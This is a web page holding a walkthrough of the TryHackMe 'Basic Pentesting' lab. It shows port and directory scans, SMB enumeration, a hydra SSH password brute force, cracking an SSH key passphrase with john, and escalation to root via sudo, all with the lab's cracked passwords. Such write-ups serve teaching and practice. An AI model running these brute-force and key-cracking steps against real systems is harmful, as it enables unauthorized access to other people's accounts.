
<!doctype html>
<html lang="en" class="no-js">
  <head>
    
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width,initial-scale=1">
      
      
      
      <link rel="icon" href="../../assets/images/favicon.png">
      <meta name="generator" content="mkdocs-1.4.0, mkdocs-material-8.5.6">
    
    
      
        <title>2022 07 23 basic Pentesting - WOLF</title>
      
    
    
      <link rel="stylesheet" href="../../assets/stylesheets/main.20d9efc8.min.css">
      
        
        <link rel="stylesheet" href="../../assets/stylesheets/palette.cbb835fc.min.css">
        
          
          
          <meta name="theme-color" content="#8bc34b">
        
      
      

    
    
    
      
        
        
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
      
    
    
    <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce((e,_)=>(e<<5)-e+_.charCodeAt(0),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
    
      

    
    
    
  </head>
  
  
    
    
    
    
    
    <body dir="ltr" data-md-color-scheme="slate" data-md-color-primary="light-green" data-md-color-accent="indigo">
  
    
    
    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
    <label class="md-overlay" for="__drawer"></label>
    <div data-md-component="skip">
      
        
        <a href="#tryhackme-easy-machine" class="md-skip">
          Skip to content
        </a>
      
    </div>
    <div data-md-component="announce">
      
    </div>
    
    
      

<header class="md-header" data-md-component="header">
  <nav class="md-header__inner md-grid" aria-label="Header">
    <a href="../.." title="WOLF" class="md-header__button md-logo" aria-label="WOLF" data-md-component="logo">
      
  <img src="../../assets/logo.jpg" alt="logo">

    </a>
    <label class="md-header__button md-icon" for="__drawer">
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2Z"/></svg>
    </label>
    <div class="md-header__title" data-md-component="header-title">
      <div class="md-header__ellipsis">
        <div class="md-header__topic">
          <span class="md-ellipsis">
            WOLF
          </span>
        </div>
        <div class="md-header__topic" data-md-component="header-topic">
          <span class="md-ellipsis">
            
              2022 07 23 basic Pentesting
            
          </span>
        </div>
      </div>
    </div>
    
    
    
      <label class="md-header__button md-icon" for="__search">
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg>
      </label>
      <div class="md-search" data-md-component="search" role="dialog">
  <label class="md-search__overlay" for="__search"></label>
  <div class="md-search__inner" role="search">
    <form class="md-search__form" name="search">
      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
      <label class="md-search__icon md-icon" for="__search">
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg>
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12Z"/></svg>
      </label>
      <nav class="md-search__options" aria-label="Search">
        
        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41Z"/></svg>
        </button>
      </nav>
      
    </form>
    <div class="md-search__output">
      <div class="md-search__scrollwrap" data-md-scrollfix>
        <div class="md-search-result" data-md-component="search-result">
          <div class="md-search-result__meta">
            Initializing search
          </div>
          <ol class="md-search-result__list"></ol>
        </div>
      </div>
    </div>
  </div>
</div>
    
    
  </nav>
  
</header>
    
    <div class="md-container" data-md-component="container">
      
      
        
          
            
<nav class="md-tabs" aria-label="Tabs" data-md-component="tabs">
  <div class="md-tabs__inner md-grid">
    <ul class="md-tabs__list">
      
        
  
  


  <li class="md-tabs__item">
    <a href="../.." class="md-tabs__link">
      Home
    </a>
  </li>

      
        
  
  


  <li class="md-tabs__item">
    <a href="../../Ctf/" class="md-tabs__link">
      Writeups
    </a>
  </li>

      
        
  
  


  <li class="md-tabs__item">
    <a href="../../Go/" class="md-tabs__link">
      Go
    </a>
  </li>

      
        
  
  


  <li class="md-tabs__item">
    <a href="../../Privesc/" class="md-tabs__link">
      Privesc
    </a>
  </li>

      
        
  
  


  
  
  
    

  
  
  
    <li class="md-tabs__item">
      <a href="../../Programming/Assembly/Commandline/" class="md-tabs__link">
        Programming
      </a>
    </li>
  

  

      
        
  
  
    
  


  
  
  
    <li class="md-tabs__item">
      <a href="../2022-01-22-knight-ctf/" class="md-tabs__link md-tabs__link--active">
        Writeups
      </a>
    </li>
  

      
    </ul>
  </div>
</nav>
          
        
      
      <main class="md-main" data-md-component="main">
        <div class="md-main__inner md-grid">
          
            
              
              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    

  


<nav class="md-nav md-nav--primary md-nav--lifted" aria-label="Navigation" data-md-level="0">
  <label class="md-nav__title" for="__drawer">
    <a href="../.." title="WOLF" class="md-nav__button md-logo" aria-label="WOLF" data-md-component="logo">
      
  <img src="../../assets/logo.jpg" alt="logo">

    </a>
    WOLF
  </label>
  
  <ul class="md-nav__list" data-md-scrollfix>
    
      
      
      

  
  
  
    <li class="md-nav__item">
      <a href="../.." class="md-nav__link">
        Home
      </a>
    </li>
  

    
      
      
      

  
  
  
    <li class="md-nav__item">
      <a href="../../Ctf/" class="md-nav__link">
        Writeups
      </a>
    </li>
  

    
      
      
      

  
  
  
    <li class="md-nav__item">
      <a href="../../Go/" class="md-nav__link">
        Go
      </a>
    </li>
  

    
      
      
      

  
  
  
    <li class="md-nav__item">
      <a href="../../Privesc/" class="md-nav__link">
        Privesc
      </a>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_5" type="checkbox" id="__nav_5" >
      
      
      
      
        <label class="md-nav__link" for="__nav_5">
          Programming
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" aria-label="Programming" data-md-level="1">
        <label class="md-nav__title" for="__nav_5">
          <span class="md-nav__icon md-icon"></span>
          Programming
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_5_1" type="checkbox" id="__nav_5_1" >
      
      
      
      
        <label class="md-nav__link" for="__nav_5_1">
          Assembly
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" aria-label="Assembly" data-md-level="2">
        <label class="md-nav__title" for="__nav_5_1">
          <span class="md-nav__icon md-icon"></span>
          Assembly
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Programming/Assembly/Commandline/" class="md-nav__link">
        Commandline Arguments
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
    
  
  
    
    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
      
      
        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_6" type="checkbox" id="__nav_6" checked>
      
      
      
      
        <label class="md-nav__link" for="__nav_6">
          Writeups
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" aria-label="Writeups" data-md-level="1">
        <label class="md-nav__title" for="__nav_6">
          <span class="md-nav__icon md-icon"></span>
          Writeups
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../2022-01-22-knight-ctf/" class="md-nav__link">
        KNIGHT CTF 2022
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../2022-02-26-mhsctf-2022/" class="md-nav__link">
        MHSCTF 2022
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../2022-03-06-urchinsec-ctf/" class="md-nav__link">
        Urchinsec 2022
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../2022-05-20-JWT/" class="md-nav__link">
        JSON WEB TOKENS (JWT)
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../2022-06-08-Late-Writeup/" class="md-nav__link">
        Late HTB Writeup
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../2022-06-08-Pandora-Writeup/" class="md-nav__link">
        Pandora HTB Writeup
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../2022-07-23-Wgel-CTF/" class="md-nav__link">
        THM Easy Box - Wgel CTF
      </a>
    </li>
  

            
          
            
              
  
  
    
  
  
    <li class="md-nav__item md-nav__item--active">
      
      <input class="md-nav__toggle md-toggle" data-md-toggle="toc" type="checkbox" id="__toc">
      
      
      
        <label class="md-nav__link md-nav__link--active" for="__toc">
          2022 07 23 basic Pentesting
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <a href="./" class="md-nav__link md-nav__link--active">
        2022 07 23 basic Pentesting
      </a>
      
        

<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
  
  
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      Table of contents
    </label>
    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#tryhackme-easy-machine" class="md-nav__link">
    TryHackMe easy Machine
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#q2-find-services-exposed-by-the-machine" class="md-nav__link">
    Q2. Find Services Exposed by the Machine
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#q3-what-is-the-name-of-the-hidden-directory-on-the-web-serverenter-name-without" class="md-nav__link">
    Q3. What is the name of the hidden directory on the web server(enter name without /)?
  </a>
  
    <nav class="md-nav" aria-label="Q3. What is the name of the hidden directory on the web server(enter name without /)?">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#port-80" class="md-nav__link">
    Port 80
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#port-8080" class="md-nav__link">
    Port 8080
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#q4-user-brute-forcing-to-find-the-username-password" class="md-nav__link">
    Q4. User brute-forcing to find the username &amp; password
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#q5what-is-the-password" class="md-nav__link">
    Q5.What is the password?
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#q6-what-service-do-you-use-to-access-the-serveranswer-in-abbreviation-in-all-caps" class="md-nav__link">
    Q6. What service do you use to access the server(answer in abbreviation in all caps)?
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#q7-enumerate-the-machine-to-find-any-vectors-for-privilege-escalation" class="md-nav__link">
    Q7. Enumerate the machine to find any vectors for privilege escalation
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#q8-what-is-the-name-of-the-other-user-you-foundall-lower-case" class="md-nav__link">
    Q8. What is the name of the other user you found(all lower case)?
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#q9-if-you-have-found-another-user-what-can-you-do-with-this-information" class="md-nav__link">
    Q9. If you have found another user, what can you do with this information?
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#q10-what-is-the-final-password-you-obtain" class="md-nav__link">
    Q10. What is the final password you obtain?
  </a>
  
    <nav class="md-nav" aria-label="Q10. What is the final password you obtain?">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#privesc" class="md-nav__link">
    Privesc
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
    </ul>
  
</nav>
      
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
  </ul>
</nav>
                  </div>
                </div>
              </div>
            
            
              
              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    

<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
  
  
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      Table of contents
    </label>
    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#tryhackme-easy-machine" class="md-nav__link">
    TryHackMe easy Machine
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#q2-find-services-exposed-by-the-machine" class="md-nav__link">
    Q2. Find Services Exposed by the Machine
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#q3-what-is-the-name-of-the-hidden-directory-on-the-web-serverenter-name-without" class="md-nav__link">
    Q3. What is the name of the hidden directory on the web server(enter name without /)?
  </a>
  
    <nav class="md-nav" aria-label="Q3. What is the name of the hidden directory on the web server(enter name without /)?">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#port-80" class="md-nav__link">
    Port 80
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#port-8080" class="md-nav__link">
    Port 8080
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#q4-user-brute-forcing-to-find-the-username-password" class="md-nav__link">
    Q4. User brute-forcing to find the username &amp; password
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#q5what-is-the-password" class="md-nav__link">
    Q5.What is the password?
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#q6-what-service-do-you-use-to-access-the-serveranswer-in-abbreviation-in-all-caps" class="md-nav__link">
    Q6. What service do you use to access the server(answer in abbreviation in all caps)?
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#q7-enumerate-the-machine-to-find-any-vectors-for-privilege-escalation" class="md-nav__link">
    Q7. Enumerate the machine to find any vectors for privilege escalation
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#q8-what-is-the-name-of-the-other-user-you-foundall-lower-case" class="md-nav__link">
    Q8. What is the name of the other user you found(all lower case)?
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#q9-if-you-have-found-another-user-what-can-you-do-with-this-information" class="md-nav__link">
    Q9. If you have found another user, what can you do with this information?
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#q10-what-is-the-final-password-you-obtain" class="md-nav__link">
    Q10. What is the final password you obtain?
  </a>
  
    <nav class="md-nav" aria-label="Q10. What is the final password you obtain?">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#privesc" class="md-nav__link">
    Privesc
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
    </ul>
  
</nav>
                  </div>
                </div>
              </div>
            
          
          
            <div class="md-content" data-md-component="content">
              <article class="md-content__inner md-typeset">
                
                  


<h2 id="tryhackme-easy-machine">TryHackMe easy Machine</h2>
<p><img alt="2022-07-23_19-10" src="https://user-images.githubusercontent.com/96860148/180613297-7c0d0162-bdf9-473a-bb80-156c4cbaf9e4.png" /></p>
<h1 id="q2-find-services-exposed-by-the-machine">Q2. Find Services Exposed by the Machine</h1>
<pre><code>┌──(wolf㉿piratesec)-[~/BOXES/thm]
└─$ cat all_online_ports 
# Nmap 7.92 scan initiated Sat Jul 23 11:41:56 2022 as: nmap -p- --min-rate 10000 --max-rate 11000 -Pn -oN all_online_ports -v -r 10.10.40.124
Increasing send delay for 10.10.40.124 from 0 to 5 due to 69 out of 229 dropped probes since last increase.
Increasing send delay for 10.10.40.124 from 320 to 640 due to 86 out of 285 dropped probes since last increase.
Warning: 10.10.40.124 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.10.40.124
Host is up (0.17s latency).
Not shown: 40021 filtered tcp ports (no-response), 25509 closed tcp ports (conn-refused)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
8080/tcp open  http-proxy

Read data files from: /usr/bin/../share/nmap
# Nmap done at Sat Jul 23 11:43:33 2022 -- 1 IP address (1 host up) scanned in 96.68 seconds

┌──(wolf㉿piratesec)-[~/BOXES/thm]
└─$
</code></pre>
<h1 id="q3-what-is-the-name-of-the-hidden-directory-on-the-web-serverenter-name-without">Q3. What is the name of the hidden directory on the web server(enter name without /)?</h1>
<h2 id="port-80">Port 80</h2>
<pre><code>┌──(wolf㉿piratesec)-[~/BOXES/thm/BasicPentesting]
└─$ ffuf -u http://10.10.40.124/FUZZ -w /usr/share/wordlists/dirb/common.txt -ac 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.5.0 Kali Exclusive &lt;3
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.40.124/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
 :: Follow redirects : false
 :: Calibration      : true
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

.htpasswd               [Status: 403, Size: 296, Words: 22, Lines: 12, Duration: 203ms]
.htaccess               [Status: 403, Size: 296, Words: 22, Lines: 12, Duration: 204ms]
.hta                    [Status: 403, Size: 291, Words: 22, Lines: 12, Duration: 209ms]
                        [Status: 200, Size: 158, Words: 20, Lines: 11, Duration: 218ms]
development             [Status: 301, Size: 318, Words: 20, Lines: 10, Duration: 291ms]
index.html              [Status: 200, Size: 158, Words: 20, Lines: 11, Duration: 397ms]
server-status           [Status: 403, Size: 300, Words: 22, Lines: 12, Duration: 228ms]
:: Progress: [4614/4614] :: Job [1/1] :: 192 req/sec :: Duration: [0:01:19] :: Errors: 1 ::

┌──(wolf㉿piratesec)-[~/BOXES/thm]
└─$
</code></pre>
<h2 id="port-8080">Port 8080</h2>
<pre><code>┌──(wolf㉿piratesec)-[~/BOXES/thm/BasicPentesting]
└─$ ffuf -u http://10.10.40.124:8080/FUZZ -w /usr/share/wordlists/dirb/common.txt -ac           

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.5.0 Kali Exclusive &lt;3
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.40.124:8080/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
 :: Follow redirects : false
 :: Calibration      : true
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

                        [Status: 200, Size: 11228, Words: 4258, Lines: 203, Duration: 179ms]
docs                    [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 2756ms]
examples                [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 1498ms]
favicon.ico             [Status: 200, Size: 21630, Words: 19, Lines: 22, Duration: 469ms]
host-manager            [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 707ms]
manager                 [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 234ms]
:: Progress: [4614/4614] :: Job [1/1] :: 82 req/sec :: Duration: [0:02:22] :: Errors: 80 ::

┌──(wolf㉿piratesec)-[~/BOXES/thm]
└─$
</code></pre>
<h1 id="q4-user-brute-forcing-to-find-the-username-password">Q4. User brute-forcing to find the username &amp; password</h1>
<p>Checking the development directory, there is a conversion between a guy going with "k" and another "J". Obviously these are users and maybe we can use them to bruteforce. However these are their initials and won't help. So now I have to find them. From the port scan, port 445 is open and the smb could provide some info. True enough, i find the names of "K" and "J" from a file "staff.txt" in the smbclient.</p>
<p>Staff.txt</p>
<pre><code>Announcement to staff:

PLEASE do not upload non-work-related items to this share. I know it's all in fun, but
this is how mistakes happen. (This means you too, Jan!)

-Kay
</code></pre>
<p>Bruteforcing SSH with Hydra</p>
<pre><code>┌──(wolf㉿piratesec)-[~/BOXES/thm/BasicPentesting]
└─$ hydra -L users -P ~/Tools/rockyou.txt ssh://10.10.40.124 -t 4 -V -I
Hydra v9.3 (c) 2022 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-07-23 12:19:58
DATA] max 4 tasks per 1 server, overall 4 tasks, 14344400 login tries (l:1/p:14344400), ~3586100 tries per task
[DATA] attacking ssh://10.10.40.124:22/
[ATTEMPT] target 10.10.40.124 - login &quot;Jan&quot; - pass &quot;123456&quot; - 1 of 14344400 [child 0] (0/0)
[ATTEMPT] target 10.10.40.124 - login &quot;Jan&quot; - pass &quot;12345&quot; - 2 of 14344400 [child 1] (0/0)
[ATTEMPT] target 10.10.40.124 - login &quot;Jan&quot; - pass &quot;123456789&quot; - 3 of 14344400 [child 2] (0/0)
[ATTEMPT] target 10.10.40.124 - login &quot;Jan&quot; - pass &quot;password&quot; - 4 of 14344400 [child 3] (0/0)
[22][ssh] host: 10.10.40.124   login: jan  password: armando
1 of 1 target successfully completed, 1 valid password found
</code></pre>
<h1 id="q5what-is-the-password">Q5.What is the password?</h1>
<pre><code>armando
</code></pre>
<h1 id="q6-what-service-do-you-use-to-access-the-serveranswer-in-abbreviation-in-all-caps">Q6. What service do you use to access the server(answer in abbreviation in all caps)?</h1>
<pre><code>SSH
</code></pre>
<h1 id="q7-enumerate-the-machine-to-find-any-vectors-for-privilege-escalation">Q7. Enumerate the machine to find any vectors for privilege escalation</h1>
<h1 id="q8-what-is-the-name-of-the-other-user-you-foundall-lower-case">Q8. What is the name of the other user you found(all lower case)?</h1>
<pre><code>kay
</code></pre>
<h1 id="q9-if-you-have-found-another-user-what-can-you-do-with-this-information">Q9. If you have found another user, what can you do with this information?</h1>
<h1 id="q10-what-is-the-final-password-you-obtain">Q10. What is the final password you obtain?</h1>
<p>In kay's directory I find a file "pass.bak" which I think is the answer. However, I can't read the file because I don't have the necessary permissions and I can't run sudo on the machine. Time for privesc...here comes linpeas</p>
<pre><code>╔══════════╣ Sudo version
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-version
Sudo version 1.8.16

╔══════════╣ CVEs Check
Vulnerable to CVE-2021-4034

sh: 1197: [[: not found
sh: 1197: rpm: not found
sh: 1197: 0: not found
sh: 1207: [[: not found
</code></pre>
<p>Trying to exploit this vulnerability was futile as I'm running as user Jan who seems to not have the necessary write permissions to create the files neede to escalate. Time to look around... Hehe, I can be able to read kay's private key.I copy the contents. When I try to login using te private_key, turns out it's encrypted and I'm asked for the password.
Time to bruteforce with JohnTheRipper to get the password protecting the private key.</p>
<pre><code>┌──(wolf㉿piratesec)-[~/BOXES/thm/BasicPentesting]
└─$ ssh2john id_rsa &gt; hash

┌──(wolf㉿piratesec)-[~/BOXES/thm/BasicPentesting]
└─$ john --wordlist=~/Tools/rockyou.txt hash 
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
beeswax          (id_rsa)     
1g 0:00:00:04 DONE (2022-07-23 13:15) 0.2183g/s 18068p/s 18068c/s 18068C/s behlat..bammer
Use the &quot;--show&quot; option to display all of the cracked passwords reliably
Session completed. 

┌──(wolf㉿piratesec)-[~/BOXES/thm/BasicPentesting]
└─$ 
</code></pre>
<p>Bingo, now I can login and read the contents of "pass.bak" and answer the questions.</p>
<pre><code>kay@basic2:~$ ls
pass.bak
kay@basic2:~$ cat pass.bak
heresareallystrongpasswordthatfollowsthepasswordpolicy$$
kay@basic2:~$ 
</code></pre>
<p>I can't leave it like that without privesc
Using the password, user Kay can run all commands as sudo</p>
<pre><code>kay@basic2:~$ sudo -l
Matching Defaults entries for kay on basic2:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User kay may run the following commands on basic2:
    (ALL : ALL) ALL
kay@basic2:~$ 
</code></pre>
<h2 id="privesc">Privesc</h2>
<pre><code>kay@basic2:~$ sudo su
root@basic2:/home/kay#
</code></pre>





                
              </article>
            </div>
          
          
        </div>
        
      </main>
      
        <footer class="md-footer">
  
    
    <nav class="md-footer__inner md-grid" aria-label="Footer" >
      
        
        <a href="../2022-07-23-Wgel-CTF/" class="md-footer__link md-footer__link--prev" aria-label="Previous: THM Easy Box - Wgel CTF" rel="prev">
          <div class="md-footer__button md-icon">
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12Z"/></svg>
          </div>
          <div class="md-footer__title">
            <div class="md-ellipsis">
              <span class="md-footer__direction">
                Previous
              </span>
              THM Easy Box - Wgel CTF
            </div>
          </div>
        </a>
      
      
    </nav>
  
  <div class="md-footer-meta md-typeset">
    <div class="md-footer-meta__inner md-grid">
      <div class="md-copyright">
  
    <div class="md-copyright__highlight">
      Copyright &copy; 2022 Calvin Kimani
    </div>
  
  
</div>
      
    </div>
  </div>
</footer>
      
    </div>
    <div class="md-dialog" data-md-component="dialog">
      <div class="md-dialog__inner md-typeset"></div>
    </div>
    
    <script id="__config" type="application/json">{"base": "../..", "features": ["navigation.tabs"], "search": "../../assets/javascripts/workers/search.5bf1dace.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.config.lang": "en", "search.config.pipeline": "trimmer, stopWordFilter", "search.config.separator": "[\\s\\-]+", "search.placeholder": "Search", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version.title": "Select version"}}</script>
    
    
      <script src="../../assets/javascripts/bundle.078830c0.min.js"></script>
      
    
  </body>
</html>